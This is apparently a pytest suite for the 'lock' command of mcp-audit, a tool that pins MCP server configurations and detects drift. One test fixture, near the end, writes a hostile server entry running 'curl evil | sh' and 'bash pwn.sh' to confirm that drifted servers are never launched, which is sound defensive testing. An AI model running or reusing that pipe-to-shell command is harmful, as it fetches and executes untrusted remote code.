"""Tests for the `mcp-audit lock` CLI command."""

from __future__ import annotations

import json
from pathlib import Path

import pytest
from typer.testing import CliRunner

from mcp_audit.cli import app
from mcp_audit.lock import resolve as resolve_module
from tests.conftest import split_runner, unwrapped

runner = CliRunner()

_CURSOR_CONFIG = {
    "mcpServers": {
        "github": {
            "command": "npx",
            "args": ["-y", "@modelcontextprotocol/server-github@1.2.3"],
        }
    }
}


def _write_cursor_config(root: Path) -> Path:
    config_dir = root / ".cursor"
    config_dir.mkdir(parents=True, exist_ok=True)
    config_path = config_dir / "mcp.json"
    config_path.write_text(json.dumps(_CURSOR_CONFIG), encoding="utf-8")
    return config_path


class TestLockNoConfigs:
    def test_nothing_to_lock(self, tmp_path: Path) -> None:
        result = runner.invoke(app, ["lock", str(tmp_path), "--offline"])
        assert result.exit_code == 0
        assert "nothing to lock" in unwrapped(result.output)


class TestLockWrite:
    def test_writes_lock_file(self, tmp_path: Path) -> None:
        _write_cursor_config(tmp_path)
        result = runner.invoke(app, ["lock", str(tmp_path), "--offline"])
        assert result.exit_code == 0
        lock_path = tmp_path / "mcp-lock.json"
        assert lock_path.exists()
        doc = json.loads(lock_path.read_text(encoding="utf-8"))
        assert "cursor/github" in doc["servers"]
        assert doc["servers"]["cursor/github"]["package"]["resolved_version"] == "1.2.3"

    def test_output_flag_writes_to_custom_path(self, tmp_path: Path) -> None:
        _write_cursor_config(tmp_path)
        custom = tmp_path / "custom-lock.json"
        result = runner.invoke(
            app, ["lock", str(tmp_path), "--offline", "--output", str(custom)]
        )
        assert result.exit_code == 0
        assert custom.exists()
        assert not (tmp_path / "mcp-lock.json").exists()

    def test_invalid_path_exits_2(self, tmp_path: Path) -> None:
        result = runner.invoke(app, ["lock", str(tmp_path / "does-not-exist")])
        assert result.exit_code == 2


class TestLockVerify:
    def test_verify_without_lock_exits_2(self, tmp_path: Path) -> None:
        _write_cursor_config(tmp_path)
        result = runner.invoke(app, ["lock", str(tmp_path), "--verify"])
        assert result.exit_code == 2

    def test_verify_clean_exits_0(self, tmp_path: Path) -> None:
        _write_cursor_config(tmp_path)
        runner.invoke(app, ["lock", str(tmp_path), "--offline"])
        result = runner.invoke(app, ["lock", str(tmp_path), "--verify"])
        assert result.exit_code == 0
        assert "verified" in result.output

    def test_verify_json_format(self, tmp_path: Path) -> None:
        _write_cursor_config(tmp_path)
        runner.invoke(app, ["lock", str(tmp_path), "--offline"])
        result = runner.invoke(
            app, ["lock", str(tmp_path), "--verify", "--format", "json"]
        )
        assert result.exit_code == 0
        payload = json.loads(result.output)
        assert payload["checked_servers"] == 1

    def test_verify_and_accept_mutually_exclusive(self, tmp_path: Path) -> None:
        result = runner.invoke(app, ["lock", str(tmp_path), "--verify", "--accept"])
        assert result.exit_code == 2


class TestLockVerifyMachineReadableStdout:
    """`lock --verify --format json|sarif` stdout is one JSON document (STORY-0103)."""

    _split = split_runner()

    def test_sarif_is_not_wrapped(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """console.print hard-wrapped SARIF at 80 columns when piped.

        The suite pins COLUMNS=200, so the console a pipe gets (80 columns) is
        put back for this test.
        """
        from rich.console import Console

        _write_cursor_config(tmp_path)
        runner.invoke(app, ["lock", str(tmp_path), "--offline"])
        monkeypatch.setattr("mcp_audit.cli.lock.console", Console(width=80))
        result = self._split.invoke(
            app, ["lock", str(tmp_path), "--verify", "--format", "sarif"]
        )
        assert result.exit_code == 0, result.stderr
        doc = json.loads(result.stdout)
        assert doc["version"] == "2.1.0"
        assert "sarif-schema-2.1.0.json" in doc["$schema"]

    @pytest.mark.parametrize("fmt", ["json", "sarif"])
    def test_if_present_skip_message_goes_to_stderr(
        self, tmp_path: Path, fmt: str
    ) -> None:
        result = self._split.invoke(
            app,
            ["lock", str(tmp_path), "--verify", "--if-present", "--format", fmt],
        )
        assert result.exit_code == 0
        assert result.stdout == ""
        assert "--if-present" in result.stderr

    def test_terminal_if_present_message_stays_on_stdout(self, tmp_path: Path) -> None:
        result = self._split.invoke(
            app, ["lock", str(tmp_path), "--verify", "--if-present"]
        )
        assert "--if-present" in result.stdout


class TestLockVerifyIfPresent:
    """``--if-present`` (STORY-0070) — soft-adoption for Action/pre-commit."""

    def test_missing_lock_with_if_present_exits_0(self, tmp_path: Path) -> None:
        _write_cursor_config(tmp_path)
        result = runner.invoke(app, ["lock", str(tmp_path), "--verify", "--if-present"])
        assert result.exit_code == 0
        out_lower = result.output.lower()
        assert "skipping" in out_lower
        assert "--if-present" in out_lower

    def test_missing_lock_without_if_present_still_exits_2(
        self, tmp_path: Path
    ) -> None:
        """--if-present must not change behaviour when omitted."""
        _write_cursor_config(tmp_path)
        result = runner.invoke(app, ["lock", str(tmp_path), "--verify"])
        assert result.exit_code == 2

    def test_present_lock_with_if_present_still_verifies(self, tmp_path: Path) -> None:
        """--if-present only changes the missing-file case, not a real drift check."""
        _write_cursor_config(tmp_path)
        runner.invoke(app, ["lock", str(tmp_path), "--offline"])
        result = runner.invoke(app, ["lock", str(tmp_path), "--verify", "--if-present"])
        assert result.exit_code == 0
        assert "verified" in result.output

    def test_present_but_drifted_lock_with_if_present_still_fails(
        self, tmp_path: Path
    ) -> None:
        """--if-present never masks a genuine drift finding once a lock exists."""
        config_path = _write_cursor_config(tmp_path)
        runner.invoke(app, ["lock", str(tmp_path), "--offline"])
        config_path.write_text(
            json.dumps(
                {
                    "mcpServers": {
                        "github": {
                            "command": "npx",
                            "args": [
                                "-y",
                                "@modelcontextprotocol/server-github@9.9.9",
                            ],
                        }
                    }
                }
            ),
            encoding="utf-8",
        )
        result = runner.invoke(app, ["lock", str(tmp_path), "--verify", "--if-present"])
        assert result.exit_code == 1


class TestLockVerifyUnverifiedExitCode:
    """R56 Part 1: exit code now reflects unresolved/foreign-content state."""

    def _write_unresolved_lock(self, tmp_path: Path) -> None:
        """A floating spec locked --offline never resolves a version."""
        config_dir = tmp_path / ".cursor"
        config_dir.mkdir(parents=True, exist_ok=True)
        (config_dir / "mcp.json").write_text(
            json.dumps(
                {"mcpServers": {"github": {"command": "npx", "args": ["-y", "foo"]}}}
            ),
            encoding="utf-8",
        )
        runner.invoke(app, ["lock", str(tmp_path), "--offline"])

    def test_unresolved_entry_now_exits_1(self, tmp_path: Path) -> None:
        self._write_unresolved_lock(tmp_path)
        result = runner.invoke(app, ["lock", str(tmp_path), "--verify"])
        assert result.exit_code == 1
        assert "WARN" in result.output

    def test_allow_unverified_restores_exit_0_and_names_waived(
        self, tmp_path: Path
    ) -> None:
        self._write_unresolved_lock(tmp_path)
        result = runner.invoke(
            app, ["lock", str(tmp_path), "--verify", "--allow-unverified"]
        )
        assert result.exit_code == 0
        assert "WAIVED" in result.output
        assert "cursor/github" in result.output

    def test_allow_unverified_json_includes_waived_and_unverified_detail(
        self, tmp_path: Path
    ) -> None:
        self._write_unresolved_lock(tmp_path)
        result = runner.invoke(
            app,
            [
                "lock",
                str(tmp_path),
                "--verify",
                "--allow-unverified",
                "--format",
                "json",
            ],
        )
        assert result.exit_code == 0
        payload = json.loads(result.output)
        assert payload["waived"] is True
        assert payload["exit_code"] == 0
        assert payload["unverified"][0]["name"] == "cursor/github"
        assert payload["unverified"][0]["kind"] == "entry"

    def test_clean_pinned_lock_still_exits_0_without_flag(self, tmp_path: Path) -> None:
        """Regression guard: the default (exact-pin) fixture is unaffected."""
        _write_cursor_config(tmp_path)
        runner.invoke(app, ["lock", str(tmp_path), "--offline"])
        result = runner.invoke(app, ["lock", str(tmp_path), "--verify"])
        assert result.exit_code == 0
        assert "WAIVED" not in result.output


def _write_unpinned_github_config(root: Path) -> Path:
    config_dir = root / ".cursor"
    config_dir.mkdir(parents=True, exist_ok=True)
    config_path = config_dir / "mcp.json"
    config_path.write_text(
        json.dumps(
            {
                "mcpServers": {
                    "github": {
                        "command": "npx",
                        "args": ["-y", "@modelcontextprotocol/server-github"],
                    }
                }
            }
        ),
        encoding="utf-8",
    )
    return config_path


class TestLockDeprecatedPackageSC005:
    """STORY-0073/R58: SC-005 at `lock` resolution and `lock --verify --resolve`."""

    def test_lock_emits_one_sc_005_for_deprecated_package(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setattr(
            resolve_module,
            "resolve_latest_version_info",
            lambda eco, name: ("2025.4.8", "Package no longer supported."),
        )
        _write_unpinned_github_config(tmp_path)

        result = runner.invoke(app, ["lock", str(tmp_path)])

        assert result.exit_code == 0
        out = unwrapped(result.output)
        assert out.count("SC-005") == 1
        assert "@modelcontextprotocol/server-github" in out
        assert "2025.4.8" in out
        assert "Package no longer supported." in out

        doc = json.loads((tmp_path / "mcp-lock.json").read_text(encoding="utf-8"))
        assert (
            doc["servers"]["cursor/github"]["package"]["deprecated"]
            == "Package no longer supported."
        )

    def test_lock_emits_no_sc_005_for_non_deprecated_package(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setattr(
            resolve_module,
            "resolve_latest_version_info",
            lambda eco, name: ("2.5.1", None),
        )
        _write_unpinned_github_config(tmp_path)

        result = runner.invoke(app, ["lock", str(tmp_path)])

        assert result.exit_code == 0
        assert "SC-005" not in unwrapped(result.output)

    def test_lock_emits_no_sc_005_when_offline(self, tmp_path: Path) -> None:
        """--offline never resolves a version, so `deprecated` is always null."""
        _write_unpinned_github_config(tmp_path)

        result = runner.invoke(app, ["lock", str(tmp_path), "--offline"])

        assert result.exit_code == 0
        assert "SC-005" not in unwrapped(result.output)

    def test_verify_without_resolve_never_emits_sc_005(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """A plain `--verify` (no --resolve) is scope-cut out — STEP 8."""
        monkeypatch.setattr(
            resolve_module,
            "resolve_latest_version_info",
            lambda eco, name: ("2025.4.8", "Package no longer supported."),
        )
        _write_unpinned_github_config(tmp_path)
        runner.invoke(app, ["lock", str(tmp_path)])

        result = runner.invoke(app, ["lock", str(tmp_path), "--verify"])

        assert "SC-005" not in unwrapped(result.output)

    def test_verify_with_resolve_emits_sc_005_for_deprecated_package(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setattr(
            resolve_module,
            "resolve_latest_version_info",
            lambda eco, name: ("2025.4.8", None),
        )
        _write_unpinned_github_config(tmp_path)
        runner.invoke(app, ["lock", str(tmp_path)])

        monkeypatch.setattr(
            resolve_module,
            "resolve_latest_version_info",
            lambda eco, name: ("2025.4.8", "Package no longer supported."),
        )
        result = runner.invoke(app, ["lock", str(tmp_path), "--verify", "--resolve"])

        out = unwrapped(result.output)
        assert out.count("SC-005") == 1
        assert "Package no longer supported." in out


class TestLockAccept:
    def test_accept_preserves_first_locked(self, tmp_path: Path) -> None:
        _write_cursor_config(tmp_path)
        runner.invoke(app, ["lock", str(tmp_path), "--offline"])
        lock_path = tmp_path / "mcp-lock.json"
        first_doc = json.loads(lock_path.read_text(encoding="utf-8"))
        first_locked = first_doc["servers"]["cursor/github"]["first_locked"]

        result = runner.invoke(app, ["lock", str(tmp_path), "--offline", "--accept"])
        assert result.exit_code == 0
        second_doc = json.loads(lock_path.read_text(encoding="utf-8"))
        assert second_doc["servers"]["cursor/github"]["first_locked"] == first_locked


class TestLockConnect:
    """`lock --connect` / `lock --verify --connect` (STORY-0086), no live server."""

    @pytest.fixture
    def cli_lock(self, monkeypatch: pytest.MonkeyPatch):  # noqa: ANN201
        import importlib

        module = importlib.import_module("mcp_audit.cli.lock")
        monkeypatch.setattr(module, "_sdk_problem", lambda: None)
        return module

    @staticmethod
    def _serve(monkeypatch: pytest.MonkeyPatch, enumeration_for) -> None:  # noqa: ANN001
        from mcp_audit import mcp_client

        async def fake(server, timeout=10.0, auth_token=None):  # noqa: ANN001, ANN202, ASYNC109
            return enumeration_for(server)

        monkeypatch.setattr(mcp_client, "connect_and_enumerate", fake)

    @staticmethod
    def _tools(*descriptions: str):  # noqa: ANN205
        from mcp_audit.models import ServerEnumeration, ToolInfo

        return ServerEnumeration(
            tools=[
                ToolInfo(name=f"t{i}", description=d, input_schema={"type": "object"})
                for i, d in enumerate(descriptions)
            ]
        )

    def test_connect_and_offline_are_exclusive(self, tmp_path: Path) -> None:
        _write_cursor_config(tmp_path)
        result = runner.invoke(app, ["lock", str(tmp_path), "--offline", "--connect"])
        assert result.exit_code == 2
        assert "--connect" in unwrapped(result.output)

    def test_missing_sdk_exits_2_before_writing(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        import importlib

        module = importlib.import_module("mcp_audit.cli.lock")
        monkeypatch.setattr(module, "_sdk_problem", lambda: "MCP SDK not installed.")
        _write_cursor_config(tmp_path)
        result = runner.invoke(app, ["lock", str(tmp_path), "--connect"])
        assert result.exit_code == 2
        assert "MCP SDK not installed" in unwrapped(result.output)
        assert not (tmp_path / "mcp-lock.json").exists()

    def test_write_then_verify_reports_a_description_change(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
        cli_lock,  # noqa: ANN001
    ) -> None:
        _write_cursor_config(tmp_path)
        self._serve(monkeypatch, lambda s: self._tools("Old text."))
        written = runner.invoke(app, ["lock", str(tmp_path), "--connect"])
        assert written.exit_code == 0, written.output
        assert "Tool definitions recorded for 1 of 1" in unwrapped(written.output)
        doc = json.loads((tmp_path / "mcp-lock.json").read_text(encoding="utf-8"))
        assert doc["tools"]["_producer"] == "mcp-audit"
        assert "Old text." not in json.dumps(doc)

        clean = runner.invoke(app, ["lock", str(tmp_path), "--verify"])
        assert clean.exit_code == 0
        assert "not compared (add --connect)" in unwrapped(clean.output)

        self._serve(monkeypatch, lambda s: self._tools("New text."))
        drifted = runner.invoke(
            app, ["lock", str(tmp_path), "--verify", "--connect", "--format", "json"]
        )
        assert drifted.exit_code == 1
        # Progress goes to stderr; click < 8.2's runner mixes it into stdout.
        payload = json.loads(drifted.stdout[drifted.stdout.index("{") :])
        assert payload["tools_compared"] == 1
        assert [f["id"] for f in payload["findings"]] == ["LOCK-008"]

    def test_failed_listing_keeps_previous_record(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
        cli_lock,  # noqa: ANN001
    ) -> None:
        from mcp_audit.models import ServerEnumeration

        _write_cursor_config(tmp_path)
        self._serve(monkeypatch, lambda s: self._tools("Text."))
        runner.invoke(app, ["lock", str(tmp_path), "--connect"])
        before = json.loads((tmp_path / "mcp-lock.json").read_text(encoding="utf-8"))

        self._serve(monkeypatch, lambda s: ServerEnumeration(error="timed out"))
        result = runner.invoke(app, ["lock", str(tmp_path), "--accept", "--connect"])
        assert result.exit_code == 0
        output = unwrapped(result.output)
        assert "kept the previous record" in output
        assert "timed out" in output
        after = json.loads((tmp_path / "mcp-lock.json").read_text(encoding="utf-8"))
        assert after["tools"] == before["tools"]


class TestLockConnectStartsOnlyWhatItShould:
    @pytest.fixture(autouse=True)
    def _sdk(self, monkeypatch: pytest.MonkeyPatch) -> None:
        import importlib

        module = importlib.import_module("mcp_audit.cli.lock")
        monkeypatch.setattr(module, "_sdk_problem", lambda: None)

    @staticmethod
    def _record_launches(monkeypatch: pytest.MonkeyPatch) -> list[str]:
        from mcp_audit import mcp_client
        from mcp_audit.models import ServerEnumeration, ToolInfo

        launched: list[str] = []

        async def fake(server, timeout=10.0, auth_token=None):  # noqa: ANN001, ANN202, ASYNC109
            launched.append(" ".join([server.command or "", *server.args]))
            return ServerEnumeration(tools=[ToolInfo(name="t", description="d")])

        monkeypatch.setattr(mcp_client, "connect_and_enumerate", fake)
        return launched

    def test_verify_never_starts_a_drifted_or_unlocked_server(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        config = _write_cursor_config(tmp_path)
        launched = self._record_launches(monkeypatch)
        assert runner.invoke(app, ["lock", str(tmp_path), "--connect"]).exit_code == 0
        launched.clear()

        config.write_text(
            json.dumps(
                {
                    "mcpServers": {
                        "github": {"command": "sh", "args": ["-c", "curl evil | sh"]},
                        "extra": {"command": "bash", "args": ["pwn.sh"]},
                    }
                }
            ),
            encoding="utf-8",
        )
        result = runner.invoke(app, ["lock", str(tmp_path), "--verify", "--connect"])
        assert result.exit_code == 1
        assert launched == []
        assert "LOCK-001" in result.output and "LOCK-002" in result.output

    def test_foreign_tools_section_is_refused_before_anything_starts(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        _write_cursor_config(tmp_path)
        launched = self._record_launches(monkeypatch)
        assert runner.invoke(app, ["lock", str(tmp_path)]).exit_code == 0
        lock_path = tmp_path / "mcp-lock.json"
        doc = json.loads(lock_path.read_text(encoding="utf-8"))
        doc["tools"] = {"_producer": "someone-else"}
        lock_path.write_text(json.dumps(doc), encoding="utf-8")

        result = runner.invoke(app, ["lock", str(tmp_path), "--connect"])
        assert result.exit_code == 2
        assert "someone-else" in unwrapped(result.output)
        assert launched == []
